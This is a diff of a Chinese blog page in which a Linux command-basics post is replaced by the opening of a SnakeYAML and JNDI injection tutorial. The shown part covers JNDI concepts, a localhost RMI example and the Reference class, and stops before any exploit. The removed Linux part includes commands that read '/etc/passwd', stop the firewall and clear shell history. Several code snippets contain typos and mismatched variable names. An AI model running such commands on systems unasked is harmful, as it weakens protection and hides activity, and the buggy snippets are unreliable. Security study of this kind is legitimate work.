@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="linux 基础, marin的小窝">
-    <meta name="description" content="linux 基础这个本来应该之前就要学的，但是之前只是把 wsl 当作一个工具的启动器，所以没有专门记录过 linux 该怎么用 orz
-搞了一个 vps 之后感觉还是要学一下
-linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
+    <meta name="keywords" content="SnakeYAML 反序列化, marin的小窝">
+    <meta name="description" content="JNDI 注入JNDI 基础JNDI (java Naming and Directory Interface) 也就是 java 命名和目录接口，当程序定义了 JNDI 中的接口后，就可通过接口 API 访问系统的命名服务和目录服务
+JN">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>linux 基础 | marin的小窝</title>
+    <title>SnakeYAML 反序列化 | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -251,12 +250,12 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/A49509B4D767F4369527F90DE4678504.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/6b5su0brt3bvxzp5za1ixqw5k.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">linux 基础</h1>
+                    <h1 class="description center-align post-title">SnakeYAML 反序列化</h1>
                 </div>
             </div>
         </div>
@@ -280,12 +279,12 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/linux/">
-                                <span class="chip bg-color">linux</span>
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/%E5%9F%BA%E7%A1%80/">
-                                <span class="chip bg-color">基础</span>
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
                             </a>
                         
                     </div>
@@ -296,8 +295,8 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/linux/" class="post-category">
-                                linux
+                            <a href="/categories/WEB/" class="post-category">
+                                WEB
                             </a>
                         
                     </div>
@@ -309,7 +308,7 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-11-28
+                    2025-09-05
                 </div>
                 
 
@@ -333,660 +332,367 @@ linuxlinux 系统的特性就是一切皆是文件，是一种类 u">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="linux-基础"><a href="#linux-基础" class="headerlink" title="linux 基础"></a>linux 基础</h1><p>这个本来应该之前就要学的，但是之前只是把 wsl 当作一个工具的启动器，所以没有专门记录过 linux 该怎么用 orz</p>
-<p>搞了一个 vps 之后感觉还是要学一下</p>
-<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>linux 系统的特性就是一切皆是文件，是一种类 unix 系统</p>
-<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><table>
+                <h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><h2 id="JNDI-基础"><a href="#JNDI-基础" class="headerlink" title="JNDI 基础"></a>JNDI 基础</h2><p>JNDI (java Naming and Directory Interface) 也就是 java 命名和目录接口，当程序定义了 JNDI 中的接口后，就可通过接口 API 访问系统的<strong>命名服务</strong>和<strong>目录服务</strong></p>
+<p>JNDI 中可以支持很多种服务：<code>LADP</code>​、<code>RMI</code>​、<code>DNS</code>​、<code>CORBA</code>等等<br>但是 JNDI 不会指定哪一个服务，而是通过 java 的 SPI 机制，这个会根据你的参数自动选择对应的服务并寻找对应的接口</p>
+<table>
 <thead>
 <tr>
-<th>目录</th>
+<th>协议</th>
 <th>作用</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>​<code>/bin</code></td>
-<td>Binary 的缩写，这个目录存放着经常使用的命令</td>
+<td>LDAP</td>
+<td>轻量级目录访问协议，约定了 Client 和 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
 </tr>
 <tr>
-<td>​<code>/sbin</code> <br /></td>
-<td>存放着系统管理员使用的系统管理程序</td>
+<td>RMI</td>
+<td>Java 远程方法协议，该协议用于远程调用应用程序编程接口，使得客户机上运行的程序可以调用远程服务器上的对象</td>
 </tr>
 <tr>
-<td>​<code>/home</code></td>
-<td>存放着普通用户的主目录，在 linux 中每个用户都有自己的一个目录，一般这个目录以用户账户命名</td>
+<td>DNS</td>
+<td>域名解析服务</td>
 </tr>
 <tr>
-<td>​<code>/root</code></td>
-<td>系统管理员的主目录</td>
-</tr>
-<tr>
-<td>​<code>/lib</code></td>
-<td>系统开机需要的动态链接共享库，作用类似于 windows 中的 DLL 文件，也就是依赖</td>
-</tr>
-<tr>
-<td>​<code>/lost+found</code></td>
-<td>一般是空的，当系统非法关机后，就会存放一些文件</td>
-</tr>
-<tr>
-<td>​<code>/etc</code></td>
-<td>所有的系统管理员所需要的配置文件和子目录</td>
-</tr>
-<tr>
-<td>​<code>/usr</code></td>
-<td>用户的很多应用程序和文件都放在这个目录下，类似 windows 下的 program files 目录</td>
-</tr>
-<tr>
-<td>​<code>/boot</code></td>
-<td>存放的是启动 linux 时使用的一些核心文件</td>
-</tr>
-<tr>
-<td>​<code>/proc</code></td>
-<td>虚拟目录，是系统内存的映射，可以访问这个目录来获取系统信息</td>
-</tr>
-<tr>
-<td>​<code>/sys</code></td>
-<td>这个是 linux 2.6 内核后有的，用来存放新的文件系统 sysfs</td>
-</tr>
-<tr>
-<td>​<code>/tmp</code></td>
-<td>存放临时文件</td>
-</tr>
-<tr>
-<td>​<code>/mnt</code></td>
-<td>为了让用户临时挂载别的文件系统，我们可以将外部的存储挂载在 <code>/mnt</code> 下，然后就可以查看里面的内容</td>
-</tr>
-<tr>
-<td>​<code>/opt</code></td>
-<td>给主机安装额外软件的目录</td>
-</tr>
-<tr>
-<td>​<code>/var</code></td>
-<td>存放不断扩充的对象，经常修改的目录放在这个目录下，比如日志文件</td>
+<td>CORBA</td>
+<td>公告对象请求代理体系结构</td>
 </tr>
 </tbody></table>
-<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><ul>
-<li>通过 上下方向键 <code>↑↓</code> 调取之前执行过的命令</li>
-<li><code>Tab</code> 补齐命令或参数</li>
-<li><code>ctrl + R</code> 用于查找使用过的命令</li>
-<li><code>ctrl + L</code> 清除屏幕并移到页面顶部</li>
-<li><code>ctrl + C</code> 终止正在执行的命令</li>
-<li><code>ctrl + A</code> 光标跳转到命令行的开头</li>
-<li><code>ctrl + E</code> 光标跳转到命令行的结尾</li>
-</ul>
-<h3 id="VI-VIM-编辑器"><a href="#VI-VIM-编辑器" class="headerlink" title="VI&#x2F;VIM 编辑器"></a>VI&#x2F;VIM 编辑器</h3><p><code>vi</code> 是 unix 操作系统和类 unix 系统中最强大的文本编辑器<br>​<code>vim</code>​ 是从 <code>vi</code> 中发展出来的一种编辑器，两者完全兼容</p>
-<h4 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h4><p>当使用 vi 打开一个文件时就默认进入一般模式，这个模式可以移动光标、删除字符、复制粘贴，但是不能自由编辑</p>
-<table>
-<thead>
-<tr>
-<th>语法</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>yy</code></td>
-<td>复制光标当前行</td>
-</tr>
-<tr>
-<td>​<code>u</code></td>
-<td>撤销上一步</td>
-</tr>
-<tr>
-<td>​<code>dd</code></td>
-<td>删除光标当前行</td>
-</tr>
-<tr>
-<td>​<code>x</code></td>
-<td>剪切一个字母，相当于 del</td>
-</tr>
-<tr>
-<td>​<code>X</code></td>
-<td>剪切一个字母，相当于 backspace</td>
-</tr>
-<tr>
-<td>​<code>G</code></td>
-<td>移动到页尾</td>
-</tr>
-<tr>
-<td>​<code>1+G</code></td>
-<td>移动到页头</td>
-</tr>
-<tr>
-<td>​<code>H</code></td>
-<td>移动到屏幕顶行</td>
-</tr>
-<tr>
-<td>​<code>L</code></td>
-<td>移动到屏幕底行</td>
-</tr>
-</tbody></table>
-<h4 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h4><p>在一般模式中输入 <code>i、l、o、O、a、A</code>​ 可以进入编辑模式，他们的差别就是光标的位置，在编辑模式中 <code>ESC</code> 就可以退回一般模式</p>
-<h4 id="指令模式"><a href="#指令模式" class="headerlink" title="指令模式"></a>指令模式</h4><p>在一般模式时，输入 <code>/、:、?</code> 光标就会移动到最下面一行，可以输入指令操作</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>:w</code></td>
-<td>保存</td>
-</tr>
-<tr>
-<td>​<code>:q</code></td>
-<td>退出</td>
-</tr>
-<tr>
-<td>​<code>:!</code></td>
-<td>强制执行</td>
-</tr>
-<tr>
-<td>​<code>:wq!</code></td>
-<td>强制保存退出</td>
-</tr>
-<tr>
-<td>​<code>/要查找的单词</code></td>
-<td>​<code>n</code>​ 查找下一个，<code>N</code> 往上查找</td>
-</tr>
-<tr>
-<td>​<code>:noh</code></td>
-<td>取消高亮显示</td>
-</tr>
-<tr>
-<td>​<code>:set nu</code></td>
-<td>显示行号</td>
-</tr>
-<tr>
-<td>​<code>:set nonu</code></td>
-<td>关闭行号</td>
-</tr>
-<tr>
-<td>​<code>:s/old/new</code></td>
-<td>将当前行第一个匹配到的 old 替换为 new</td>
-</tr>
-<tr>
-<td>​<code>:s/old/new/g</code></td>
-<td>将当前行匹配到的所有 old 替换为 new</td>
-</tr>
-<tr>
-<td>​<code>:%s/old/new</code></td>
-<td>替换文档每一行匹配到的第一个 old 替换为 new</td>
-</tr>
-<tr>
-<td>​<code>:%s/old/new/g</code></td>
-<td>将文档中的所有 old 替换为 new</td>
-</tr>
-</tbody></table>
-<p>‍</p>
-<h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p><code>systemctl</code> system control 系统控制</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">systemctl start|stop|restart|status 服务名</code></pre>
-
-<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><ul>
-<li><p>查看防火墙状态</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">systemctl status firewalld</code></pre></li>
-<li><p>临时关闭防火墙</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">systemctl stop firewalld</code></pre></li>
-</ul>
-<p>‍</p>
-<h3 id="文件目录类命令"><a href="#文件目录类命令" class="headerlink" title="文件目录类命令"></a>文件目录类命令</h3><ol>
-<li><p><code>pwd</code> ：显示当前工作目录的绝对路径</p>
-<p> <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250803230549.png" alt="image"></p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">pwd -P # 查看快捷方式对应的物理路径</code></pre></li>
-<li><p><code>ls</code>：列出目录的内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ls [选项] [目录参数]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-a</code></td>
-<td>全部文件，包括隐藏文件（开头为 <code>.</code> 的文件）一起列出来</td>
-</tr>
-<tr>
-<td>​<code>-l</code></td>
-<td>长数据串列出，包含文件的属性于权限等数据</td>
-</tr>
-</tbody></table>
-<p> <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250803230826.png" alt="image"></p>
-</li>
-<li><p><code>cd</code>：切换目录</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cd [参数]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>cd ~</code>​  \  <code>cd</code></td>
-<td>回到自己的家目录</td>
-</tr>
-<tr>
-<td>​<code>cd -</code></td>
-<td>回到上一次的目录</td>
-</tr>
-<tr>
-<td>​<code>cd ../</code></td>
-<td>回到上一级的目录</td>
-</tr>
-<tr>
-<td>​<code>cd -P</code></td>
-<td>跳转到实际物理路径，而非快捷方式</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>mkdir</code>：创建一个新的目录</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mkdir [要创建的目录]
-mkdir -p [创建多级目录]</code></pre></li>
-<li><p><code>rmdir</code>：删除一个空目录</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">rmdir [要删除的目录]</code></pre></li>
-<li><p><code>touch</code>：创建空文件</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">rmdir [文件名]</code></pre></li>
-<li><p><code>cp</code>：复制文件或目录</p>
-<p> 复制 source 文件到 dest</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cp [选项] source dest</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-r</code></td>
-<td>递归复制整个文件夹</td>
-</tr>
-<tr>
-<td>​<code>-P</code></td>
-<td>进入软连接实际物理路径</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>rm</code>：删除文件或目录</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">rm [选项] [文件名]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-r</code></td>
-<td>递归删除目录中的所有内容</td>
-</tr>
-<tr>
-<td>​<code>-f</code></td>
-<td>强制执行删除操作，不会提示用户是否确认删除</td>
-</tr>
-<tr>
-<td>​<code>-v</code></td>
-<td>显示命令的详细执行过程</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>mv</code>：移动文件与目录或重命名</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mv [oldName] [newName] # 重命名文件
-mv [文件&#x2F;目录] [文件&#x2F;目录]</code></pre></li>
-<li><p><code>cat</code>：查看文件内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cat [选项] [文件名]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-n</code></td>
-<td>显示所有行的行号，也包括空行</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>more</code>：文件内容分屏查看器</p>
-<p> 适合查看超过一个屏幕的文件，支持上下翻页的文件内容</p>
-<p> more 是一个基于 vi 编辑器的文本过滤器</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">more [文件名]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>操作</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>space</code>​  、 <code>↓</code></td>
-<td>向下翻一页</td>
-</tr>
-<tr>
-<td>​<code>b</code>​ 、<code>↑</code></td>
-<td>向上翻一页</td>
-</tr>
-<tr>
-<td>​<code>enter</code></td>
-<td>向下翻一行</td>
-</tr>
-<tr>
-<td>​<code>q</code></td>
-<td>代表离开 more ，不再显示该文件内容</td>
-</tr>
-<tr>
-<td>​<code>=</code></td>
-<td>输出当前行的行号</td>
-</tr>
-<tr>
-<td>​<code>:f</code></td>
-<td>输出文件名和当前行的行号</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>less</code>：分屏显示文件内容</p>
-<p> 用来分屏查看文件内容，他的功能与 more 指令类似，但是比 more 指令更强大，less 显示文件不是将整个文件加载之后才显示，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">less [文件名]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>操作</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>space</code>​  、<code>↓</code></td>
-<td>向下翻一页</td>
-</tr>
-<tr>
-<td>​<code>b</code>​ 、<code>↑</code></td>
-<td>向上翻一页</td>
-</tr>
-<tr>
-<td>​<code>/字符串</code></td>
-<td>向下搜寻字符串的功能<br /><code>n</code>​：向下查找；<code>N</code>：向上查找<br /></td>
-</tr>
-<tr>
-<td>​<code>?字符串</code></td>
-<td>向上搜寻字符串的功能<br /><code>n</code>​：向下查找；<code>N</code>：向上查找</td>
-</tr>
-<tr>
-<td>​<code>q</code></td>
-<td>离开程序</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>echo</code>：输出内容到控制台</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">echo [内容]</code></pre></li>
-<li><p><code>head</code>：显示文件头部内容</p>
-<p> 默认情况下显示文件的前 10 行内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">head [文件]
-head -n 5 [文件]  # 查看5行的内容</code></pre></li>
-<li><p><code>tail</code>：输出文件尾部内容</p>
-<p> 默认显示后 10 行内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">tail -n 5 [文件]  # 查看5行的内容
-tail -f [文件]    # 实时追踪该文档的所有更新</code></pre></li>
-<li><p><code>&gt;</code> ：输出重定向</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ls -l &gt; [目标文件]  # 将命令结果写入到目标文件中，会覆盖</code></pre></li>
-<li><p><code>&gt;&gt;</code>：追加内容</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cat 1.txt &gt;&gt; [目标文件]   # 将命令结果追加到目标文件中</code></pre></li>
-<li><p><code>ln</code>：创建软连接</p>
-<p> 类似于 windows 里的快捷方式，有自己的数据块，主要存放了连接其他文件的路径</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ln -s [源文件或目录] [软连接名称]</code></pre>
-
-<p> <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250804154417.png" alt="image"></p>
-</li>
-<li><p><code>history</code>：查看已执行过的历史命令</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">history
-history -c   # 清除命令历史记录</code></pre></li>
-</ol>
-<p>‍</p>
-<h3 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><ol>
-<li><p><code>useradd</code>：添加新用户</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">useradd [用户名]				# 添加新用户
-useradd -g [组名] [用户名] 	# 添加新用户到某个组</code></pre></li>
-<li><p><code>passwd</code>：设置用户密码</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">passwd [用户名]  			# 为指定的用户设置密码</code></pre></li>
-<li><p><code>id</code>：查看用户是否存在</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">id [用户名]</code></pre></li>
-<li><p><code>cat /etc/passwd</code>：查看创建了哪些用户</p>
-<p> 所有创建的用户在 <code>/etc/passwd</code> 文件中都会有记录</p>
-</li>
-<li><p><code>su</code>：切换用户</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">su [用户名]		# 切换到目标用户，只能获得目标用户的执行权限，不能获得其环境变量
-su - [用户名]	# 切换到目标用户并获得目标用户的环境变量及执行权限</code></pre></li>
-<li><p><code>userdel</code>：删除用户</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">userdel [用户名]			# 删除用户，会保留用户的主目录
-userdel -r [用户名]		# 删除用户及其主目录</code></pre></li>
-<li><p><code>whoami</code>：查看登录用户信息</p>
-</li>
-<li><p><code>sudo</code>：设置用户具有 root 权限</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo [管理员命令]</code></pre></li>
-</ol>
-<p>‍</p>
-<h3 id="文件权限类命令"><a href="#文件权限类命令" class="headerlink" title="文件权限类命令"></a>文件权限类命令</h3><ol>
-<li><p><code>ll</code>​ 相当于 <code>ls -l</code> 查看文件属性以及 文件属性说明</p>
-<p> 这里的最前面的 10 个字符表示文件类型与权限</p>
-<p> <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250804160557.png"></p>
-<blockquote>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250804160758.png"></p>
+<p>这里的命名服务和目录服务与常规的理解有点不一样</p>
+<h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>通过名字查找对象</p>
 <ul>
-<li><p>第 0 位：表示文件类型</p>
+<li>DNS：通过域名查找实际的 IP 地址</li>
+<li>文件系统：通过文件名定位到具体的文件</li>
+</ul>
+<p>在命名服务中有一些重要的概念</p>
 <ul>
-<li><code>-</code>：代表文件</li>
-<li><code>d</code>：代表目录</li>
-<li><code>l</code>：代表连接文件</li>
+<li><code>Bindings</code> (绑定)：表示一个名称和对应对象之间的关联关系，又名称和对象组成</li>
+<li><code>Context</code>​ (上下文)：代表命名服务中的一个命名空间，并提供了查找、绑定、解绑等方法处理名称和对象，<code>Context</code> 使得 JNDI 的命名空间可以类似文件系统</li>
+<li><code>References</code> (引用)：表示某个名称对应对象的指针，命名服务利用这个来提供对对象的间接访问，能用工厂等方式重建一个对象，而不是直接返回一个对象</li>
 </ul>
-</li>
-<li><p>第 1-3 位：文件所有者拥有的权限</p>
-</li>
-<li><p>第 4-6 位：该文件所属组拥有的权限</p>
-</li>
-<li><p>第 7-9 位：其他用户对该文件拥有的权限</p>
-</li>
+<h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>目录服务是命名服务的拓展，不仅可以将对象映射到名称上，还可以为这些对象提供关联的属性，通过这些属性可以过滤对象</p>
+<p>‍</p>
+<h3 id="JNDI-API-和-SPI"><a href="#JNDI-API-和-SPI" class="headerlink" title="JNDI API 和 SPI"></a>JNDI API 和 SPI</h3><p>JNDI 包含两个主要部分：API 和 SPI</p>
+<h4 id="JNDI-API"><a href="#JNDI-API" class="headerlink" title="JNDI API"></a>JNDI API</h4><p>API 是应用编程接口，是 JNDI 提供给 Java 应用的一组标准类和接口，用来执行命名和目录服务</p>
+<p><strong>命名服务</strong></p>
+<ul>
+<li><code>Context.lookup()</code>：根据名称查找一个对象</li>
+<li><code>Context.bind()</code>：将一个名称绑定到一个对象</li>
+<li><code>Context.rebind()</code>：重新绑定一个名称到一个对象</li>
+<li><code>Context.unbind()</code>：在这个命名空间中解除这个名称和对象的绑定</li>
 </ul>
-</blockquote>
-</li>
-<li><p><code>chmod</code>：改变文件或目录权限</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">chmod [权限设置] [文件名]</code></pre>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#x2F;&#x2F; 创建 JNDI 上下文
+Context context &#x3D; new InitialContext();
+&#x2F;&#x2F; 用名字查找数据库连接
+DataSource dataSource &#x3D; (DataSource) context.lookup(&quot;jdbc&#x2F;MyDatabase&quot;);
+&#x2F;&#x2F; 获取连接
+Connection connection &#x3D; dataSource.getConnection();</code></pre>
+
+<p><strong>目录服务</strong></p>
+<ul>
+<li><code>Context.getAttributes()</code>：获取对象的属性</li>
+<li><code>Context.modifyAttributes()</code>：修改对象的属性</li>
+<li><code>Contest.search()</code>：根据过滤条件搜索对象</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#x2F;&#x2F; 创建 JNDI 上下文
+Context context &#x3D; new InitialContext();
+&#x2F;&#x2F; 查找名字
+Attributes atts &#x3D; context.getAttributes(&quot;name&quot;);
+&#x2F;&#x2F; 获取相关属性
+String title &#x3D; (String) attrs.get(&#39;title&#39;).get();
+String department &#x3D; (String) attrs.get(&quot;department&quot;).get();</code></pre>
+
+<p>‍</p>
+<h4 id="JNDI-SPI"><a href="#JNDI-SPI" class="headerlink" title="JNDI SPI"></a>JNDI SPI</h4><p>SPI 是服务提供接口，是 JNDI 提供给 java 的一组抽象类和接口，用来开发特定的命名或目录服务</p>
+<ul>
+<li>命名服务提供者接口：需要实现 <code>javax.naming.spi.NamingManager</code> 类和相关接口，提供命名服务的具体实现</li>
+<li>目录服务提供者接口：需要实现 <code>javax.naming.spi.DirContext</code> 及其子类，提供目录操作的实现</li>
+</ul>
+<p>SPI 允许不同的命名和目录服务集成到 JNDI 中，使得 JNDI 能够支持不用的服务，如：DNS、RMI 等<br>同时通过 SPI，能够拓展 JNDI 框架，不需要修改 JNDI API 就能够支持不同的服务</p>
+<p>‍</p>
+<h3 id="JNDI-案例"><a href="#JNDI-案例" class="headerlink" title="JNDI 案例"></a>JNDI 案例</h3><p>实现一个利用 JNDI 接口调用 RMI 的案例</p>
+<p><strong>接口</strong></p>
+<p><code>Remote</code>​ 接口，任何打算让客户端远程调用的接口都需要实现这个接口，并且所有在远程接口中定义的方法都要抛出 <code>java.rmi.RemoteException</code></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+&#x2F;&#x2F; 实现了 Remote 接口
+public interface Hello extends Remote &#123;
+    String sayHello(String input) throws RemoteException;
+&#125;</code></pre>
+
+<p><strong>实现类</strong></p>
+<p><code>UnicastRemoteObject</code> 是 RMI 提供的基础类，只有继承了这个类的对象才是 RMI 远程对象</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class HelloImpl extends UnicastRemoteObject implements Hello &#123;
+    protected HelloImpl() throws RemoteException &#123;
+    &#125;
+
+    @Override
+    public String sayHello(String input) throws RemoteException &#123;
+        return input;
+    &#125;
+&#125;</code></pre>
+
+<p><strong>RMI 服务端</strong></p>
+<p>通过命名服务，实现了服务的暴露和发布</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer &#123;
+    public static void main(String[] args) throws RemoteException &#123;
+        &#x2F;&#x2F; 将 Hello 服务转化成 RMI 远程服务接口
+		Hello skeleton &#x3D; new HelloImpl();
+		&#x2F;&#x2F; 将 RMI 服务注册到 1099 端口
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+		&#x2F;&#x2F; 注册 Hello 服务，服务名为 Hello
+        registry.rebind(&quot;Hello&quot;, skeleton);
+    &#125;
+&#125;</code></pre>
+
+<p><strong>JNDI 客户端</strong></p>
+<p><code>Context.INITIAL_CONTEXT_FACTORY</code> 指定了要使用哪个 SPI 实现 API ，这里指定的就是 RMI 服务</p>
+<p><code>Context.PROVIDER_URL</code> 提供了 RMI 注册表的地址</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+import java.util.Hashtable;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        &#x2F;&#x2F; 设置 JNDI 环境变量
+		Hashtable&lt;String, String&gt; env &#x3D; new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL,&quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);
+		&#x2F;&#x2F; 初始化上下文
+        Context ctx &#x3D; new InitialContext(env);
+		&#x2F;&#x2F; 通过命名服务查找远程服务 Hello
+        Hello hello &#x3D; (Hello) ctx.lookup(&quot;Hello&quot;);
+        System.out.println(hello.sayHello(&quot;成功连接到RMI服务，并且实现&quot;));
+    &#125;
+&#125;</code></pre>
+
+<p>最后先打开服务端，再启动客户端，就能实现</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002150938.png" alt="image"></p>
+<p>‍</p>
+<h3 id="JNDI-Reference"><a href="#JNDI-Reference" class="headerlink" title="JNDI Reference"></a>JNDI Reference</h3><p><code>Reference</code> 是一种轻量级的、可序列化的数据结构，不包含一个对象，但是包含了重建一个目标对象需要的全部信息，一般是用来表示不直接存储在命名或目录系统中的对象的引用</p>
+<p><code>Reference</code> 类主要有以下几个构造方法</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public Reference(String className,String factory,String factoryLocation)
+public Reference(String className)
+public Reference(String className,Vector&lt;RefAddr&gt; addrs,String factory, String factoryLocation)</code></pre>
 
 <blockquote>
-<p>使用数字方式设置权限，会用三位数字，分别表示：用户、组、其他人</p>
-<table>
-<thead>
-<tr>
-<th>权限</th>
-<th>含义</th>
-<th>数字</th>
-</tr>
-</thead>
